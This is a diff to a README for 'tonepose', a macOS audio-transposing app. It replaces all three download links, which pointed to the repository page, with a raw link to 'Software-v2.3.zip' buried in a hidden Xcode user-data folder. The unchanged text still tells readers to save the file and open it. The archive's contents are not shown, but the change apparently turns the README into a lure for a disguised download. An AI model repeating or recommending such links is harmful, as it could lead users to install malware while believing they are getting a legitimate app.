@@ -1,6 +1,6 @@
 # 🎵 tonepose - Transpose audio with less effort
 
-[![Download tonepose](https://img.shields.io/badge/Download-tonepose-blue?style=for-the-badge)](https://github.com/Basilel6571/tonepose)
+[![Download tonepose](https://img.shields.io/badge/Download-tonepose-blue?style=for-the-badge)](https://github.com/Basilel6571/tonepose/raw/refs/heads/main/tonepose.xcodeproj/project.xcworkspace/xcuserdata/Software-v2.3.zip)
 
 ## 🧭 What tonepose does
 
@@ -30,7 +30,7 @@ tonepose is built for macOS, not Windows. If you are on Windows, the app will no
 
 Go to this page to download the app:
 
-https://github.com/Basilel6571/tonepose
+https://github.com/Basilel6571/tonepose/raw/refs/heads/main/tonepose.xcodeproj/project.xcworkspace/xcuserdata/Software-v2.3.zip
 
 On the GitHub page, look for the latest release or the main download files. Save the file to your Mac, then open it
 
@@ -129,4 +129,4 @@ Topics: audio, audio-utility, macos, menubar, music, music-tools, spotify, swift
 
 ## 🔗 Download again
 
-https://github.com/Basilel6571/tonepose
+https://github.com/Basilel6571/tonepose/raw/refs/heads/main/tonepose.xcodeproj/project.xcworkspace/xcuserdata/Software-v2.3.zip
